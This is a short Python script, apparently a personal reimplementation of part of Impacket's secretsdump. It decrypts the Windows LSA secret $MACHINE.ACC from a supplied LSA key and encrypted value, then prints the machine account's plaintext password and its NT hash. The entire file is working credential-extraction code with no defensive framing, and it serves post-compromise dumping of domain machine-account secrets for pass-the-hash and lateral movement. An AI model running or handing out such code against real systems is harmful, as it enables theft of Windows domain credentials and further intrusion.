import subprocess

lsaKey = input("Enter the LSAKey value: ").strip()
lsaKey = lsaKey.replace(" ", "")

currVal = input("Enter the currVal of MACHINE.ACC: ")
currVal = currVal.replace(" ", "")

groupByByte = []
for i in range(0, len(currVal), 2): 
    groupByByte.append(currVal[i:i+2])
    
version = "".join(groupByByte[0:4])
encKeyId = "".join(groupByByte[4:20])
encAlgorithm = "".join(groupByByte[20:24])
flags = "".join(groupByByte[24:28])
salt = "".join(groupByByte[28:60])
encryptedPayload = "".join(groupByByte[60:])

salt = salt * 1000

derivedKey = subprocess.run(
    ["openssl", "dgst", "-sha256", "-binary"],
    input=bytes.fromhex(lsaKey) + bytes.fromhex(salt),
    capture_output=True,
).stdout

derivedKeyHex = derivedKey.hex()

decryptedPayload = subprocess.run(
    ["openssl", "enc", "-aes-256-ecb", "-d", "-K", derivedKeyHex, "-nopad"],
    input=bytes.fromhex(encryptedPayload),
    capture_output=True,
).stdout

groupByByte = []
decryptedPayloadHex = decryptedPayload.hex()

for i in range(0, len(decryptedPayloadHex), 2): 
    groupByByte.append(decryptedPayloadHex[i:i+2])
    

secretLength = groupByByte[0:4]
secretLength = bytes.fromhex("".join(secretLength))
secretLength = int.from_bytes(secretLength, byteorder="little")
reserved = groupByByte[4:16]

secretData = groupByByte[16:16 + secretLength]
hexPlaintext = "".join(secretData)

binPlaintext = bytes.fromhex(hexPlaintext)
plaintext = binPlaintext.decode("utf-16-le")


#Might be useful to also have the NT-HASH of the machine password:
secretData = bytes.fromhex("".join(secretData))
result = subprocess.run(
    ["openssl", "dgst", "-provider", "legacy", "-md4", "-binary"],
    input=secretData,
    capture_output=True,
).stdout

ntHash = result.hex()



print(f"\n$MACHINE.ACC:plain_password_hex: {hexPlaintext}")
print(f"\n$MACHINE.ACC NT-Hash: {ntHash}") #Impacket secretsdump outputs this as lmHash:ntHash but i don't see the purpose of creating the lmHash 
print(f"\nUTF-16-le encoded string representation of MACHINE.ACC password: {plaintext}")


#you can compare to a dump from secretsdump
